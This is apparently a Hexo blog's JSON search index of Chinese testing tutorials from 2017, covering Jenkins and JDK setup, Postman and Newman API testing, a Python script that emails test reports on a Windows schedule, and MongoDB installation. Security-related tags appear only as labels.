总结以上网页只能展示最基本的信息，在测试的时候结合观看服务器的资源情况，得出合理的结论，locust是一个非常便于操作的性能测试工具，学习成本低，很容易上手，它不仅能测试简单的小系统，配合pyzmq库也能对大型系统进行多机分布式压测，locust现在还没有成为主流性能测试工具，目前这个工具的更新还是比较频繁，在未来使用应该会越来越广泛。xx","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"性能测试","slug":"性能测试","permalink":"http://yoursite.com/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"name":"locust","slug":"locust","permalink":"http://yoursite.com/tags/locust/"}]},{"title":"接口自动化-Jenkins持续集成","slug":"Jenkins安装与使用","date":"2017-08-31T10:30:00.000Z","updated":"2018-12-17T02:30:56.795Z","comments":true,"path":"2017/08/31/Jenkins安装与使用/","link":"","permalink":"http://yoursite.com/2017/08/31/Jenkins%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","excerpt":"","text":"安装JDK1.下载JDK，下载地址点击[网盘链接]，密码：30bs2.配置环境变量新建JAVA_HOME系统环境变量，变量值处输入JDK安装目录，如”D:\\Program Files\\Java\\jdk1.8.0_131“新建CLASSPATH变量，变量值为”.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar“,这里注意最前面有个点修改Path变量，在最后添加”;%JAVA_HOME%\\bin“在cmd中输入”java -version“，看到版本信息就是已经安装配置成功。 jenkins安装与配置1.下载安装这里安装配置的平台是Windows平台，整个安装过程也是比较简单。 方法一：首先进入[Jenkins官网]下载Windows平台的安装包，页面往下拉会看到不同平台的下载连接，点击Windows，下载的是个.zip压缩包，解压以后得到.msi安装包，直接双击运行默认安装即可。 方法二：跟上一步一样，进入官网下载最下面.war格式的包，然后在本地打开cmd命令行，输入命令 1java -jar jenkins.war 注：如果不是在jenkins.war所在的路径执行命令的话，要在命令里面写上jenkins.war的完整路径。 安装完成后默认浏览器会自动打开jenkins主页：http://localhost:8080 ，Jenkins的默认端口是8080。 2.输入密钥首次进入Jenkins主页后会有下图这样的提示，在提示的路径下找到这个密钥文件，用记事本打开复制密码到这个输入框，点击”continue” 3.安装插件在这一步有两个选项，推荐安装插件和自己选择安装哪些插件，如果不确定的话，直接点击左边的推荐安装，常用的插件就直接开始安装，这个过程持续几分钟，有进度条提示。 4.创建账户上一步完成后自动进入这个页面，填写用户名密码邮箱等，点击”save and finish”即可完成配置，再点击”start use jenkins”就进入了Jenkins的首页，整安装过程就完成了。xx","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"持续集成","slug":"持续集成","permalink":"http://yoursite.com/tags/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"Jenkins","slug":"Jenkins","permalink":"http://yoursite.com/tags/Jenkins/"}]},{"title":"定时任务与Python发送邮件(Windows平台)","slug":"windows定时任务和python发送邮件","date":"2017-08-25T10:30:00.000Z","updated":"2020-05-22T06:43:55.594Z","comments":true,"path":"2017/08/25/windows定时任务和python发送邮件/","link":"","permalink":"http://yoursite.com/2017/08/25/windows%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%92%8Cpython%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/","excerpt":"","text":"前言上一篇文章《postman接口用例批量执行(Newman)》已经在本地生成了测试报告，这时候需要设置一个定时任务每天早上自动执行测试用例，并且发送邮件给指定人员，这里用python执行cmd命和模拟发送邮件，然后设置widows计划任务即可每天自动运行。(Linux使用crontab命令设置定时任务) 用到的python库 smtplib email os python执行cmd命令1234def test_command(): &#39;&#39;&#39;调用cmd执行接口测试命令&#39;&#39;&#39; command &#x3D; r&#39;newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\测试环境.postman_environment.json -r html,json,junit,cli --reporter-html-export E:\\api_collection\\report.html --reporter-json-export E:\\api_collection\\report.json --reporter-junit-export E:\\api_collection\\report.xml&#39; print(os.system(command)) 将执行接口测试用例的命令赋值给变量command，在通过print(os.system(command))方法来执行命令，生成测试报告，因为Newman已经配置好了环境变量，所以不用关注在哪个路径下执行命令。 设计在本地获取测试报告的函数1def html_report(testreport): 这个testreport参数是测试报告所在的目录 1.罗列目录下的文件1lists &#x3D; os.listdir(testreport) 2.找到html测试报告1234567for i in lists: if &#39;.html&#39; in i: html_report &#x3D; os.path.join(testreport,i) #获取html格式的测试报告 print(html_report) return html_report else: pass for循环来遍历目录下所有报告的文件名，通过文件后缀是否是.html来找到html测试报告，os.path.join(testreport,i)方法把文件目录和文件名合并成完整的路径。 设计发送邮件的函数1def send_mail(html_report): html_report参数就是上一个函数的返回值。 1.创建一个带附件的实例1234msg &#x3D; MIMEMultipart()msg[&#39;Subject&#39;] &#x3D; Header(&#39;自动化测试报告&#39;,&#39;utf-8&#39;) #这个是邮件主题名称msg[&#39;From&#39;] &#x3D; Header(&#39;peili&#39;,&#39;utf-8&#39;) #发送者名字msg[&#39;To&#39;] &#x3D; Header(&#39;ceshi&#39;,&#39;utf-8&#39;) #接收者名字 2.邮件正文内容1msg.attach(MIMEText(&#39;测试组8月分享(报告在附件)&#39;,&#39;html&#39;,&#39;utf-8&#39;)) MIMEText的第二个参数是发送的文本类型，有html，plain，base64等。 3.添加一个附件1234file1 &#x3D; MIMEText(open(html_report,&#39;rb&#39;).read(),&#39;base64&#39;,&#39;utf-8&#39;)file1[&#39;Content-Type&#39;] &#x3D; &#39;application&#x2F;octet-stream&#39;file1[&quot;Content-Disposition&quot;] &#x3D; &#39;attachment; filename&#x3D;&quot;report.html&quot;&#39; #这里的filename就是邮件中附件的名字，可以自己命名msg.attach(file1) 添加多个附件的话就再复制这四行代码多写几个，修改open(xx,&#39;rb&#39;)就好。 4.连接邮件服务器并发送邮件1234smtp &#x3D; smtplib.SMTP_SSL(&#39;smtp.exmail.qq.com&#39;, 465) #使用的是腾讯企业邮箱服务器，端口465smtp.login(&#39;lipei@xxx.com&#39;, &#39;password&#39;) #两个参数分别是发送者的企业邮箱账号和密码smtp.sendmail(sender, receiver, msg.as_string()) #前两个参数分别是发送邮箱和接收邮箱smtp.quit() 1.smtp.sendmail(sender, receiver, msg.as_string())第二个参数receiver邮件接收者可以是一个列表，达到群发的目的。2.这里我用的是腾讯企业邮箱，如果使用的是个人QQ邮箱的话，登陆密码不能直接写邮箱密码，需要填写QQ邮箱的授权码，登陆网页版QQ邮箱，在设置-&gt;账户里面找到，并记得开启下图所示的服务。 注：经过平时的使用发现个人QQ邮箱发送邮件会偶尔失败，即使设置好了服务和第三方授权码仍然会有授权码失效等莫名其妙的问题，不知道是不是QQ邮箱的什么安全策略导致的。 设置定时任务前面已经把python脚本编写完毕，包括从测试用例执行到发送邮件，现在设置一个定时任务，每天自动运行就可以了，Windows7及以前使用at命令，windows8及以后使用schtasks命令： 12345Windows7及以前at 8:00 python E:\\api_collection\\send_email.pywindows8及以后schtasks &#x2F;create &#x2F;tn api_test &#x2F;tr &quot;python E:\\api_collection\\send_email.py&quot; &#x2F;sc daily &#x2F;st 8:00 意思就是每天早上8点钟执行这个python脚本。 不足之处可以看到利用python能完成自动执行测试用例并发送邮件，但是需要写很多代码，也不能在线实时监控，因此这种方式并不是最好的方式，下一篇文章将会写一些Jenkins的东西，通过Jenkins做持续集成要方便的多，想要真正做自动化早晚都要接触Jenkins的。 完整代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import smtplibfrom email.mime.text import MIMETextfrom email.header import Headerfrom email.mime.multipart import MIMEMultipartimport ostestreport ='E:/api_collection/report'sender = 'lipei@xxx.com'receiver = ['123456789@qq.com','123456789@qq.com']def test_command(): '''调用cmd执行接口测试命令''' command = r'newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\测试环境.postman_environment.json -r html,json,junit,cli --reporter-html-export E:\\api_collection\\report\\report.html --reporter-json-export E:\\api_collection\\report\\report.json --reporter-junit-export E:\\api_collection\\report\\report.xml' print(os.system(command))def html_report(testreport): #这个参数填写的是测试报告所在的目录 '''在本地找到html测试报告''' lists = os.listdir(testreport) for i in lists: if '.html' in i: html_report = os.path.join(testreport,i) #获取html格式的测试报告 print(html_report) return html_report else: passdef send_mail(html_report): '''发送邮件''' #创建一个带附件的实例 msg = MIMEMultipart() msg['Subject'] = Header('自动化测试报告','utf-8') #这个是邮件主题名称 msg['From'] = Header('peili','utf-8') msg['To'] = Header('ceshi','utf-8') #邮件正文内容 msg.attach(MIMEText('瑞云测试组接口测试8月分享(报告在附件)','html','utf-8')) #第二个参数是邮件格式，可以换成其他的比如说'html'，'base64'，'plain'等 #添加附件 file1 = MIMEText(open(html_report,'rb').read(),'base64','utf-8') file1['Content-Type'] = 'application/octet-stream' file1[\"Content-Disposition\"] = 'attachment; filename=\"report.html\"' #这里的filename就是邮件中附件的名字，可以自己命名 msg.attach(file1) try: smtp = smtplib.SMTP_SSL('smtp.exmail.qq.com', 465) #QQ邮箱发送服务器以及端口，SMTP默认端口是25，这里改成465 smtp.login('lipei@xxx.com', 'password') #如果是QQ邮箱的话，第二个参数不是直接用的密码，用的是QQ邮箱的授权码 smtp.sendmail(sender, receiver, msg.as_string()) #前两个参数分别是发送邮箱和接收邮箱 smtp.quit() print('测试报告邮件发送成功') except smtplib.SMTPException as e: print(e)if __name__ == '__main__': test_command() html_report = html_report(testreport) send_mail(html_report) 相关文章postman安装以及问题postman简单使用postman接口用例批量执行(Newman)peili","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"邮件","slug":"邮件","permalink":"http://yoursite.com/tags/%E9%82%AE%E4%BB%B6/"}]},{"title":"postman接口用例批量执行(Newman)","slug":"postman接口用例批量执行","date":"2017-08-24T10:30:00.000Z","updated":"2018-12-17T02:30:56.849Z","comments":true,"path":"2017/08/24/postman接口用例批量执行/","link":"","permalink":"http://yoursite.com/2017/08/24/postman%E6%8E%A5%E5%8F%A3%E7%94%A8%E4%BE%8B%E6%89%B9%E9%87%8F%E6%89%A7%E8%A1%8C/","excerpt":"","text":"前言上一篇《postman简单使用》文章讲了postman的基本用法以及自带的批量执行方式，这种方式简单有效，但是做自动化就有一定的局限了，这篇文章主要是newman的用法，将postman用例导出，用newman在Windows命令行来执行，并且生成测试报告。 Newman的安装1.安装Node.js官网地址：https://nodejs.org/en/download/在Node.js官网选择合适的版本，我这里选择的是Windows平台64位的，下载完成后安装，一路点击下一步就好。安装完后在cmd里面运行node -v,出现以下版本号信息就是安装成功。 12C:\\windows\\system32&gt;node -vv6.11.1 2.安装NewmanNode.js已经自带了npm，因此直接在命令行直接输入以下命令，等待安装完成。 1npm install -g newman 安装完成后，在命令行输入newman -v,出现下面版本号信息就是已经安装成功。 12C:\\windows\\system32&gt;newman -v3.8.0 Newman命令这里只写以下最常用的命令及参数，更多详情参考Newman官方文档。 1.最简单的命令任何路径下打开cmd里面输入这个命令 1newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\测试环境.postman_environment.json E:\\api_collection\\test.postman_collection.json就是上一篇文章最后面导出到本地的接口用例collectionE:\\api_collection\\测试环境.postman_environment.json是上一篇文章最后面导出的环境配置信息执行完毕后可以直接在cmd窗口看到如下测试结果，但是用例较多的时候就不方便看了，因此在本地生成测试报告会更好。 1234567891011121314151617181920212223242526272829C:\\windows\\system32&gt;newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\测试环境.postman_environment.jsonnewmantest→ test_linshi POST 10.60.xx.xx:8888&#x2F;api&#x2F;test&#x2F;user&#x2F;userLogin [500 Internal Server Error, 327B, 124ms] √ Status code is 200 √ Body matches string┌─────────────────────────┬──────────┬──────────┐│ │ executed │ failed │├─────────────────────────┼──────────┼──────────┤│ iterations │ 1 │ 0 │├─────────────────────────┼──────────┼──────────┤│ requests │ 1 │ 0 │├─────────────────────────┼──────────┼──────────┤│ test-scripts │ 1 │ 0 │├─────────────────────────┼──────────┼──────────┤│ prerequest-scripts │ 0 │ 0 │├─────────────────────────┼──────────┼──────────┤│ assertions │ 2 │ 0 │├─────────────────────────┴──────────┴──────────┤│ total run duration: 204ms │├───────────────────────────────────────────────┤│ total data received: 118B (approx) │├───────────────────────────────────────────────┤│ average response time: 124ms │└───────────────────────────────────────────────┘ 2.执行多次1newman run E:\\api_collection\\test.postman_collection.json -n 10 在上一个命令的后面加上-n 10，也就是这条测试命令运行10次。 3.生成测试报告1newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\测试环境.postman_environment.json -r html,json,junit --reporter-json-export jsonOut.json --reporter-junit-export xmlOut.xml --reporter-html-export htmlOut.html -r html,json,junit 指定我要生成html，json，xml这三种形式的测试报告--reporter-json-export jsonOut.json 生成json格式的测试报告，报告名前面没有添加路径的话就会生成在执行命令所在的当前目录--reporter-junit-export xmlOut.xml 生成xml格式的测试报告--reporter-html-export htmlOut.html 生成html格式的测试报告 生成结果如下： 相关文章postman安装以及问题postman简单使用定时任务与Python发送邮件xx","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"接口测试","slug":"接口测试","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"postman","slug":"postman","permalink":"http://yoursite.com/tags/postman/"},{"name":"工具使用","slug":"工具使用","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"newman","slug":"newman","permalink":"http://yoursite.com/tags/newman/"}]},{"title":"postman简单使用","slug":"postman简单使用","date":"2017-08-22T10:30:00.000Z","updated":"2018-12-17T02:30:56.741Z","comments":true,"path":"2017/08/22/postman简单使用/","link":"","permalink":"http://yoursite.com/2017/08/22/postman%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"前言上一篇文章《postman安装以及问题》已经说明了如何安装好postman，现在写一下postman的使用，它用法非常丰富多样，这里只举简单的例子来说明大致的操作流程，包括请求、断言、保存、批量执行、导入导出等。 GET请求上图就是一个最简单的GET请求，请求方法下拉框选择GET，接口地址栏填写需要请求的接口，我这里直接写了百度的主页，然后点击Send就完成了请求。下方是请求的结果，可以看到右侧状态码是200状态证明请求成功，请求返回值是一个html。页面最左侧有history请求历史栏，可以在这里找已经发送过的所有请求，选择点击以后可以重复请求。 POST请求在请求方法下拉框选择POST方法，接口地址栏填写需要请求的接口，然后填写请求参数。在请求的body部分点击form-data，以key-value样式请求参数。或者点击raw，以json格式填写请求参数，开发给的接口文档里面参数哦较多的话一般以json格式书写，所以只要复制粘贴过来填写到body部分的raw栏下就可以。 请求断言设置了断言以后能清楚的看出这个请求是否通过，也是后面做自动化的必备条件。点击请求的test栏，在输入框填写断言，这里的写法都是js格式的，但是也不用担心写起来麻烦，因为常用的断言postman已经在右侧给出了现成的写法，点击一下就可以自动填写到test栏下。比如我这里选择Status code：Code is 200来判断请求返回的状态码是不是200，点击send请求之后可以在下方请求结果的Test栏看到结果是失败的，因为这个接口还没有开发完成，状态码返回的是500。 设置环境变量一般测试环境、开发环境、线上环境的环境是独立开来的，设置好环境变量以后，接口地址稍做调整，请求的时候选择对应的环境就能很方便的切换到不同的环境来测试。 1.点击下图中所示的小齿轮按钮，然后点击Manage Enviroments 2.在Manage Enviroments栏下点击Add 3.编辑环境的名称以及接口名称和IP端口，点击Update保存 4.修改请求url返回到postman主页面，将接口前面的IP和端口换成刚刚设置好的环境的key，写在两对大括号里面，可以看到字体自动变成了橙色，鼠标放到上面能看到这个key所对应的value，也就是IP和端口。然后在环境下拉框选择想要测试的环境，我这里选择的是编辑好的测试环境，这个时候请求就会在测试环境请求了，想要在线上测试的话，就在环境下拉框选择编辑好的线上环境就好了。 保存到接口集合大部分情况下，一个系统模块有很多个接口，把请求都放在该模块的一个集合下方便管理。 1.左侧切换到collections栏，点击添加按钮 2.填写集合名称和集合描述并保存 3.点击请求右侧的save按钮，点击save as 4.弹窗内填写请求的名称和描述等，下方选择点击刚刚创建的集合并保存 批量执行请求postman自带的runner可以批量执行一个集合的接口用例 1.点击主页左上方的Runner 2.选择集合 选择点击刚刚创建的test111集合 Environment勾选需要测试的环境 Iteration是执行测试，这里就执行一次就好 点击Start Run就开始执行，右侧能看到请求结果，最上方是汇总 导出与导入postman能很方便的将接口测试集合导出到本地，同样的也能从本地导入进来。 导出collection与环境变量1.点击请求集合右侧的三个点 -&gt; Export 2.弹窗点击Export这里有collection v1和collection v2两种模式，v2模式导出的东西更多，一般选择v1就可以了。 3.在环境变量设置这里选择要导出的环境，点击右侧向下箭头即可将环境保存到本地。 4.导出到本地的请求集合和环境都是json格式的文件 导入Collection直接点击postman左上方的Import按钮，在本地选择collection即可 注册登陆不登录并不会影响工具的使用，但是登陆以后接口测试用例都可以保存到账号里面，不管是在那个电脑上登陆自己的账号就都能看到已经保存的接口测试集合，所以还是推荐登陆账号使用，谷歌邮箱可以直接登陆，支持国内的QQ邮箱等注册登陆。 相关文章postman安装以及问题postman接口用例批量执行(Newman)定时任务与Python发送邮件xx","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"接口测试","slug":"接口测试","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"postman","slug":"postman","permalink":"http://yoursite.com/tags/postman/"},{"name":"工具使用","slug":"工具使用","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"mongodb安装及可能出现的问题","slug":"mongodb安装","date":"2017-08-14T17:03:00.000Z","updated":"2018-12-17T02:30:56.668Z","comments":true,"path":"2017/08/15/mongodb安装/","link":"","permalink":"http://yoursite.com/2017/08/15/mongodb%E5%AE%89%E8%A3%85/","excerpt":"","text":"目录 下载mongodb 配置 启动mongodb 进入mongodb 注册为Windows服务 可能出现的问题 一、下载mongodb进入官网，选择适合的版本并下载到本地，不同操作系统，32位64位都有对应的安装包，比如我下载的是msi格式的安装程序，下载后直接双击运行安装，我安装的路径是 D:\\application\\mongodb。 二、配置1.在D:\\application\\mongodb路径下新建一个Data目录 2.继续进入Data目录创建一个db目录，一个log目录 3.继续进入log目录新建一个MongoDB.log的文件 三、启动mongodb用管理员身份启动cmd，cd进入D:\\application\\mongodb\\bin，输入： 1mongod.exe -dbpath &quot;D:\\application\\mongodb\\Data\\db&quot; 作用：将mongodb的数据库文件创建到D:\\application\\mongodb\\Data\\db目录注意：1、注意是mongod.exe，不是mongo.exe，不要搞混了。2、此时界面最后一行会显示waiting for connections on port 27017则表示数据库已经启动成功。 四、进入mongodb仍然是在bin目录下，新建一个cmd窗口，运行mongo.exe（注意跟mongod.exe区分开）就进入了mongodb交互界面。 五、注册为Windows服务1.用管理员身份（必须是管理员）启动cmd，进入D:\\application\\mongodb\\bin，2.输入： 1mongod.exe -dbpath &quot;D:\\application\\mongodb\\Data\\db&quot; -logpath &quot;D:\\application\\mongodb\\Data\\log\\MongoDB.log&quot; -install -serviceName &quot;MongoDB&quot; 此时服务就已经安装成功。运行net start mongodb(开启服务) 相应的net stop mongodb(关闭服务) 六、可能遇到的问题1.操作被拦截操作被拦截在操作过程中电脑管家，安全卫士等软件会拦截操作，一律允许，或者操作之前先把这些软件完全退出（其实可以直接卸载掉这些用处不是很大的软件）。 2.服务注册失败服务注册失败，查看在D:\\application\\mongodb\\Data\\log\\MongoDB.log里面记录的信息为“Error connecting to the Service Control Manager: 拒绝访问”这种情况就是因为cmd不是通过管理员方式启动的，没有权限造成的，所以为了以防万一，上面所有的cmd操作都用管理员方式打开。 3.服务启动失败服务注册完成后，运行命令net start mongodb启动服务可能会失败，这个时候去删掉db目录下这两个文件再重新启动服务就好了D:\\application\\mongodb\\Data\\dbmongod.lockstorage.bsonxx","categories":[{"name":"Web开发","slug":"Web开发","permalink":"http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"数据库","slug":"数据库","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"mongodb","slug":"mongodb","permalink":"http://yoursite.com/tags/mongodb/"}]},{"title":"postman安装以及问题","slug":"postman","date":"2017-08-07T04:30:00.000Z","updated":"2018-12-17T02:30:56.712Z","comments":true,"path":"2017/08/07/postman/","link":"","permalink":"http://yoursite.com/2017/08/07/postman/","excerpt":"","text":"目录 一、native版（推荐） 二、chrome版在线安装（官方不再更新维护） 三、chrome版本地安装 一、native版这个版本是直接下载安装包在本地安装即可，有Windows，MacOS，Linux版本。进入官网地址，这里我选择Windows版本64位，下载到本地正常安装打开即可，启动后软件上方有菜单栏，这也是native版与chrome版本的区别之一。 二、chrome版在线安装如果可以科学上网的话，最方便的就是直接在谷歌浏览器应用商店搜索postman，安装这两个插件即可。然后在应用里面就可以找到postman,右键postman图标，点击“创建快捷方式”可以在桌面创建postman图标。 三、chrome版本地安装大部分chrome浏览器插件都可以利用直接拖拽.crx插件到浏览器的方式安装，但是有些插件比较特殊不能这样安装成功，postman就是其中之一。 1.安装postman下载已经打包好的postman插件，注意是.zip的压缩包，不是.crx格式的文件。（我已经打包好最新的5.1.3版本放在百度云，链接: https://pan.baidu.com/s/1kVQMrL9 密码: r5rn）下载完成后解压该文件，然后把其中“_metadata”文件夹的名称修改为“metadata”，也就是去掉前面的小横线，不修改的话可能会报错（注：插件安装以后这个文件夹不能删除，建议放在不经常变动的地方）。 在浏览器设置里打开“扩展程序”，或者直接在地址栏输入“chrome://extensions/”进入扩展程序页面。① 在开发者模式前面打上勾② 点击加载已解压的扩展程序③ 选择刚刚解压出来的文件夹后点击确定就能安装成功 2.安装Postman Interceptor插件安装这个插件可以直接从电脑里拖到浏览器扩展程序页面安装 相关文章postman简单使用postman接口用例批量执行(Newman)定时任务与Python发送邮件xx","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"接口测试","slug":"接口测试","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"postman","slug":"postman","permalink":"http://yoursite.com/tags/postman/"}]}],"categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"},{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"},{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"Web开发","slug":"Web开发","permalink":"http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"免杀","slug":"免杀","permalink":"http://yoursite.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"内网穿透","slug":"内网穿透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"name":"域控","slug":"域控","permalink":"http://yoursite.com/tags/%E5%9F%9F%E6%8E%A7/"},{"name":"密码凭证","slug":"密码凭证","permalink":"http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"权限维持","slug":"权限维持","permalink":"http://yoursite.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"端口","slug":"端口","permalink":"http://yoursite.com/tags/%E7%AB%AF%E5%8F%A3/"},{"name":"扫描器","slug":"扫描器","permalink":"http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"},{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"多线程","slug":"多线程","permalink":"http://yoursite.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"kali linux","slug":"kali-linux","permalink":"http://yoursite.com/tags/kali-linux/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"},{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"},{"name":"UI自动化","slug":"UI自动化","permalink":"http://yoursite.com/tags/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"验证码","slug":"验证码","permalink":"http://yoursite.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"requests","slug":"requests","permalink":"http://yoursite.com/tags/requests/"},{"name":"APP","slug":"APP","permalink":"http://yoursite.com/tags/APP/"},{"name":"STF","slug":"STF","permalink":"http://yoursite.com/tags/STF/"},{"name":"接口测试","slug":"接口测试","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"log","slug":"log","permalink":"http://yoursite.com/tags/log/"},{"name":"unittest","slug":"unittest","permalink":"http://yoursite.com/tags/unittest/"},{"name":"excel","slug":"excel","permalink":"http://yoursite.com/tags/excel/"},{"name":"Windows","slug":"Windows","permalink":"http://yoursite.com/tags/Windows/"},{"name":"semantic UI","slug":"semantic-UI","permalink":"http://yoursite.com/tags/semantic-UI/"},{"name":"html","slug":"html","permalink":"http://yoursite.com/tags/html/"},{"name":"css","slug":"css","permalink":"http://yoursite.com/tags/css/"},{"name":"系统命令","slug":"系统命令","permalink":"http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"},{"name":"性能测试","slug":"性能测试","permalink":"http://yoursite.com/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"name":"locust","slug":"locust","permalink":"http://yoursite.com/tags/locust/"},{"name":"持续集成","slug":"持续集成","permalink":"http://yoursite.com/tags/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"name":"Jenkins","slug":"Jenkins","permalink":"http://yoursite.com/tags/Jenkins/"},{"name":"邮件","slug":"邮件","permalink":"http://yoursite.com/tags/%E9%82%AE%E4%BB%B6/"},{"name":"postman","slug":"postman","permalink":"http://yoursite.com/tags/postman/"},{"name":"工具使用","slug":"工具使用","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"newman","slug":"newman","permalink":"http://yoursite.com/tags/newman/"},{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"数据库","slug":"数据库","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"mongodb","slug":"mongodb","permalink":"http://yoursite.com/tags/mongodb/"}]}